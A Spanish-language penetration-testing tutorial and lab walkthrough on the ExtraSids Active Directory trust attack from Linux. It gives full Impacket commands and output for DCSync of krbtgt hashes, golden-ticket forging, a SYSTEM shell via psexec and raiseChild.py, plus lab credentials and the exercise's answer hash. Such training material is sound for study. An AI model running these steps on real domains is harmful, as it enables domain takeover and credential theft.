
# Ataque de confianza de dominio -  Desde Linux

## <mark style="color:purple;">Ataque ExtraSids desde Linux</mark>

También podemos realizar el ataque que se muestra en la sección anterior desde un host de ataque Linux. Para ello, necesitaremos recopilar los mismos datos:

* `El hash KRBTGT para el dominio secundario`
* `El SID del dominio secundario`
* `El nombre de un usuario de destino en el dominio secundario (¡no necesita existir!)`
* `El FQDN del dominio secundario`
* `El SID del grupo de administradores empresariales del dominio raíz`

Una vez que tengamos control total del dominio secundario, `LOGISTICS.INLANEFREIGHT.LOCAL` podemos usar `secretsdump.py` DCSync y obtener el hash NTLM para la cuenta KRBTGT.

### **Realizar DCSync con secretsdump.py**

```shell-session
afsh4ck@kali$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
krbtgt:des-cbc-md5:fee04c3d026d7538
[*] Cleaning up...
```

A continuación, podemos utilizar [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) del kit de herramientas Impacket para realizar una búsqueda de fuerza bruta de SID para encontrar el SID del dominio secundario. En este comando, lo que especifiquemos para la dirección IP (la IP del controlador de dominio en el dominio secundario) se convertirá en el dominio de destino para una búsqueda de SID.&#x20;

La herramienta nos devolverá el SID del dominio y los RID de cada usuario y grupo que podrían usarse para crear su SID en el formato `DOMAIN_SID-RID`. Por ejemplo, a partir del resultado a continuación, podemos ver que el SID del `lab_adm` usuario sería `S-1-5-21-2806153819-209893948-922872689-1001`.

### **Fuerza bruta de SID con lookupsid.py**

```shell-session
afsh4ck@kali$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 172.16.5.240
[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
500: LOGISTICS\Administrator (SidTypeUser)
501: LOGISTICS\Guest (SidTypeUser)
502: LOGISTICS\krbtgt (SidTypeUser)
512: LOGISTICS\Domain Admins (SidTypeGroup)
513: LOGISTICS\Domain Users (SidTypeGroup)
514: LOGISTICS\Domain Guests (SidTypeGroup)
515: LOGISTICS\Domain Computers (SidTypeGroup)
516: LOGISTICS\Domain Controllers (SidTypeGroup)
517: LOGISTICS\Cert Publishers (SidTypeAlias)
520: LOGISTICS\Group Policy Creator Owners (SidTypeGroup)
521: LOGISTICS\Read-only Domain Controllers (SidTypeGroup)
522: LOGISTICS\Cloneable Domain Controllers (SidTypeGroup)
525: LOGISTICS\Protected Users (SidTypeGroup)
526: LOGISTICS\Key Admins (SidTypeGroup)
553: LOGISTICS\RAS and IAS Servers (SidTypeAlias)
571: LOGISTICS\Allowed RODC Password Replication Group (SidTypeAlias)
572: LOGISTICS\Denied RODC Password Replication Group (SidTypeAlias)
1001: LOGISTICS\lab_adm (SidTypeUser)
1002: LOGISTICS\ACADEMY-EA-DC02$ (SidTypeUser)
1103: LOGISTICS\DnsAdmins (SidTypeAlias)
1104: LOGISTICS\DnsUpdateProxy (SidTypeGroup)
1105: LOGISTICS\INLANEFREIGHT$ (SidTypeUser)
1106: LOGISTICS\htb-student_adm (SidTypeUser)
```

Podemos filtrar el ruido canalizando la salida del comando a grep y buscando solo el SID del dominio.

### **Buscando el SID del dominio**

```shell-session
afsh4ck@kali$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

Password:

[*] Domain SID is: S-1-5-21-2806153819-209893948-92287268
```

A continuación, podemos volver a ejecutar el comando, apuntando al controlador de dominio INLANEFREIGHT (DC01) en 172.16.5.5 y tomar el dominio `SID S-1-5-21-3842939050-3880317879-2865463114` y adjuntar el RID del grupo de administradores de la empresa. [Aquí](https://adsecurity.org/?p=1001) hay una lista útil de SID conocidos.

### **Obtener el SID del dominio y adjuntarlo al RID del grupo Enterprise Admins**

```shell-session
afsh4ck@kali$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

Password:
[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: INLANEFREIGHT\administrator (SidTypeUser)
501: INLANEFREIGHT\guest (SidTypeUser)
502: INLANEFREIGHT\krbtgt (SidTypeUser)
512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
513: INLANEFREIGHT\Domain Users (SidTypeGroup)
514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
```

Hemos recopilado los siguientes puntos de datos para construir el comando de nuestro ataque. Una vez más, utilizaremos el usuario inexistente `hacker` para falsificar nuestro Golden Ticket.

* El hash KRBTGT para el dominio secundario: `9d765b482771505cbe97411065964d5f`
* El SID del dominio secundario: `S-1-5-21-2806153819-209893948-922872689`
* El nombre de un usuario de destino en el dominio secundario (¡no necesita existir!): `hacker`
* El FQDN del dominio secundario: `LOGISTICS.INLANEFREIGHT.LOCAL`
* El SID del grupo Enterprise Admins del dominio raíz: `S-1-5-21-3842939050-3880317879-2865463114-519`

A continuación, podemos utilizar [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) del kit de herramientas Impacket para construir un ticket dorado. Este ticket será válido para acceder a los recursos del dominio secundario (especificado por `-domain-sid`) y del dominio principal (especificado por `-extra-sid`).

### **Crear un Golden Ticket usando ticketer.py**

```shell-session
afsh4ck@kali$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in hacker.ccache
```

El ticket se guardará en nuestro sistema como un archivo [de caché de credenciales (ccache)](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) , que es un archivo que se utiliza para almacenar las credenciales de Kerberos. Al configurar la variable de entorno `KRB5CCNAME`, se le indica al sistema que utilice este archivo para los intentos de autenticación de Kerberos.

**Configuración de la variable de entorno KRB5CCNAME**

```shell-session
afsh4ck@kali$ export KRB5CCNAME=hacker.ccache 
```

Podemos comprobar si podemos autenticarnos correctamente en el controlador de dominio del dominio principal mediante [la versión de Psexec de Impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) . Si lo hacemos correctamente, se nos enviará a un shell con privilegios `SYSTEM` en el controlador de dominio de destino.

**Obtención de un shell SYSTEM utilizando psexec.py de Impacket**

```shell-session
afsh4ck@kali$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 172.16.5.5.....
[*] Found writable share ADMIN$
[*] Uploading file nkYjGWDZ.exe
[*] Opening SVCManager on 172.16.5.5.....
[*] Creating service eTCU on 172.16.5.5.....
[*] Starting service eTCU.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
ACADEMY-EA-DC01
```

Impacket también tiene la herramienta [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) , que automatizará la escalada del dominio secundario al dominio principal. Necesitamos especificar el controlador de dominio de destino y las credenciales para un usuario administrativo en el dominio secundario; el script hará el resto. Si revisamos el resultado, vemos que comienza enumerando los nombres de dominio completos (FQDN) del dominio secundario y principal. Luego:

* Obtiene el SID para el grupo Enterprise Admins del dominio principal
* Recupera el hash de la cuenta KRBTGT en el dominio secundario
* Crea un Golden Ticket
* Inicia sesión en el dominio principal
* Recupera las credenciales de la cuenta de administrador en el dominio principal

Finalmente, si se especifica el conmutador `target-exec`, se autentica en el controlador de dominio del dominio principal a través de Psexec.

**Realizar el ataque con raiseChild.py**

```shell-session
afsh4ck@kali$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
[*] Forest FQDN is: INLANEFREIGHT.LOCAL
[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
[*] Getting credentials for INLANEFREIGHT.LOCAL
INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
[*] Target User account name is administrator
INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file BnEGssCE.exe
[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Creating service UVNb on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Starting service UVNb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>exit
[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Stopping service UVNb.....
[*] Removing service UVNb.....
[*] Removing file BnEGssCE.exe.....
```

El script enumera el flujo de trabajo y el proceso en un comentario de la siguiente manera:

```python
#   The workflow is as follows:
#       Input:
#           1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'
#              The domain specified MUST be the domain FQDN.
#           2) Optionally a pathname to save the generated golden ticket (-w switch)
#           3) Optionally a target-user RID to get credentials (-targetRID switch)
#              Administrator by default.
#           4) Optionally a target to PSEXEC with the target-user privileges to (-target-exec switch).
#              Enterprise Admin by default.
#
#       Process:
#           1) Find out where the child domain controller is located and get its info (via [MS-NRPC])
#           2) Find out what the forest FQDN is (via [MS-NRPC])
#           3) Get the forest's Enterprise Admin SID (via [MS-LSAT])
#           4) Get the child domain's krbtgt credentials (via [MS-DRSR])
#           5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
#              and setting expiration 10 years from now
#           6) Use the generated ticket to log into the forest and get the target user info (krbtgt/admin by default)
#           7) If file was specified, save the golden ticket in ccache format
#           8) If target was specified, a PSEXEC shell is launched
#
#       Output:
#           1) Target user credentials (Forest's krbtgt/admin credentials by default)
#           2) A golden ticket saved in ccache for future fun and profit
#           3) PSExec Shell with the target-user privileges (Enterprise Admin privileges by default) at target-exec
#              parameter.
```

Aunque herramientas como esta `raiseChild.py` pueden resultar útiles y ahorrarnos tiempo, es esencial comprender el proceso y poder realizar la versión más manual reuniendo todos los puntos de datos necesarios. En este caso, si la herramienta falla, es más probable que comprendamos por qué y podamos solucionar el problema que falta, algo que no podríamos hacer si la ejecutamos a ciegas.&#x20;

En un entorno de producción de clientes, debemos tener **`siempre`** cuidado al ejecutar cualquier tipo de script "autopwn" como este, y siempre ser cautelosos y construir comandos manualmente cuando sea posible. Existen otras herramientas que pueden tomar datos de una herramienta como BloodHound, identificar rutas de ataque y realizar una función "autopwn" que puede intentar realizar cada acción en una cadena de ataque para elevarnos a Administrador de dominio (como una ruta de ataque ACL larga). Recomendaría evitar herramientas como estas y trabajar con herramientas que comprenda completamente y que también le brinden el mayor grado de control durante todo el proceso.

`¡No queremos decirle al cliente que algo se rompió porque usamos un script "autopwn"!`

***

## <mark style="color:purple;">Caso práctico</mark>

<pre><code>SSH a 10.129.87.123 (ACADEMY-EA-ATTACK01)
<strong>SSH a 10.129.116.255 (ACADEMY-EA-DC02)
</strong>user "htb-student"
password "HTB_@cademy_stdnt!"
</code></pre>

Realice el ataque ExtraSids para comprometer el dominio principal desde el host de ataque Linux. Después de comprometer el dominio principal, obtenga el hash NTLM para el usuario administrador del dominio `bross`. Envíe este hash como respuesta.

#### Extraer hash de la cuenta KRBTGT

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $impacket-secretsdump logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
krbtgt:des-cbc-md5:fee04c3d026d7538
[*] Cleaning up...
```

#### Brute force de SIDs con lookupsid.py

```
┌─[htb-student@ea-attack01]─[/opt/impacket/examples]
└──╼ $python3 lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 172.16.5.240
[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
500: LOGISTICS\Administrator (SidTypeUser)
501: LOGISTICS\Guest (SidTypeUser)
502: LOGISTICS\krbtgt (SidTypeUser)
512: LOGISTICS\Domain Admins (SidTypeGroup)
513: LOGISTICS\Domain Users (SidTypeGroup)
514: LOGISTICS\Domain Guests (SidTypeGroup)
515: LOGISTICS\Domain Computers (SidTypeGroup)
516: LOGISTICS\Domain Controllers (SidTypeGroup)
517: LOGISTICS\Cert Publishers (SidTypeAlias)
520: LOGISTICS\Group Policy Creator Owners (SidTypeGroup)
521: LOGISTICS\Read-only Domain Controllers (SidTypeGroup)
522: LOGISTICS\Cloneable Domain Controllers (SidTypeGroup)
525: LOGISTICS\Protected Users (SidTypeGroup)
526: LOGISTICS\Key Admins (SidTypeGroup)
553: LOGISTICS\RAS and IAS Servers (SidTypeAlias)
571: LOGISTICS\Allowed RODC Password Replication Group (SidTypeAlias)
572: LOGISTICS\Denied RODC Password Replication Group (SidTypeAlias)
1001: LOGISTICS\lab_adm (SidTypeUser)
1002: LOGISTICS\ACADEMY-EA-DC02$ (SidTypeUser)
1103: LOGISTICS\DnsAdmins (SidTypeAlias)
1104: LOGISTICS\DnsUpdateProxy (SidTypeGroup)
1105: LOGISTICS\INLANEFREIGHT$ (SidTypeUser)
1106: LOGISTICS\htb-student_adm (SidTypeUser)
```

#### Extraer el Domain SID

```bash
┌─[htb-student@ea-attack01]─[/opt/impacket/examples]
└──╼ $lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
Password:
[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
```

#### **Obtener el SID del dominio y adjuntarlo al RID del grupo Enterprise Admins**

```bash
┌─[htb-student@ea-attack01]─[/opt/impacket/examples]
└──╼ $lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
Password:
[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: INLANEFREIGHT\administrator (SidTypeUser)
501: INLANEFREIGHT\guest (SidTypeUser)
502: INLANEFREIGHT\krbtgt (SidTypeUser)
512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
513: INLANEFREIGHT\Domain Users (SidTypeGroup)
514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
```

#### Datos recopilados

```
- El hash KRBTGT para el dominio secundario: 9d765b482771505cbe97411065964d5f
- El SID del dominio secundario: S-1-5-21-2806153819-209893948-922872689
- El nombre de un usuario de destino en el dominio secundario (¡no necesita existir!): hacker
- El FQDN del dominio secundario: LOGISTICS.INLANEFREIGHT.LOCAL
- El SID del grupo Enterprise Admins del dominio raíz: S-1-5-21-3842939050-3880317879-2865463114-519
```

#### Crear un Golden Ticket con Ticketer

```bash
┌─[htb-student@ea-attack01]─[/]
└──╼ $sudo impacket-ticketer -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in hacker.ccache
```

#### Verificar ticket en memoria

```bash
┌─[htb-student@ea-attack01]─[/]
└──╼ $klist
Ticket cache: FILE:hacker.ccache
Default principal: hacker@LOGISTICS.INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
07/26/2024 11:33:34  07/24/2034 11:33:34  krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL@LOGISTICS.INLANEFREIGHT.LOCAL
```

#### Exportar variable de entorno KRB5CCNAME

```bash
┌─[✗]─[htb-student@ea-attack01]─[/]
└──╼ $export KRB5CCNAME=hacker.ccache
```

#### Shell con privilegios SYSTEM

```shell-session
┌─[htb-student@ea-attack01]─[/]
└──╼ $impacket-psexec LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 172.16.5.5.....
[*] Found writable share ADMIN$
[*] Uploading file ifstvjqy.exe
[*] Opening SVCManager on 172.16.5.5.....
[*] Creating service EzHI on 172.16.5.5.....
[*] Starting service EzHI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

{% hint style="info" %}
Si queremos hacer más técnicas tendremos que crear nuevos tickets y exportar la variable de entorno para que funcione
{% endhint %}

#### Extraer el hash del usuario bross (Administrador de dominio)

```bash
┌─[htb-student@ea-attack01]─[/tmp]
└──╼ $impacket-secretsdump -just-dc-user bross LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\bross:1179:aad3b435b51404eeaad3b435b51404ee:49a074a39dd0651f647e765c2cc794c7:::
[*] Kerberos keys grabbed
inlanefreight.local\bross:aes256-cts-hmac-sha1-96:538b551100c1815081893a64defdf323117557b933c8762c2783afe8eef9ecff
inlanefreight.local\bross:aes128-cts-hmac-sha1-96:6a645011e4b5948ed081a956eb515e7c
inlanefreight.local\bross:des-cbc-md5:152ab9ec52b00b0e
[*] Cleaning up... 
```

En la siguiente línea vemos el hash del usuario bross, concretamente la última cadena de la línea:

```
inlanefreight.local\bross:1179:aad3b435b51404eeaad3b435b51404ee:49a074a39dd0651f647e765c2cc794c7:::
```

```
Hash NTLM: 49a074a39dd0651f647e765c2cc794c7
```

Con esto podríamos por ejemplo realizar ataques [Pass the Hash](/ethical-hacking-cheatsheet/post-explotacion/post-explotacion/movimientos-laterales/pass-the-hash-pth.md) sin necesidad de crackearlo.

***

## <mark style="color:purple;">Más diversión</mark>

En la siguiente sección, analizaremos brevemente algunas técnicas que se pueden utilizar para abusar de la confianza entre bosques cuando nos encontramos en un entorno con una confianza entre bosques bidireccional (lo que significa que podemos autenticarnos en otro bosque). No cubriremos todos los posibles ataques a la confianza entre bosques, ya que los trataremos en detalle en módulos posteriores.
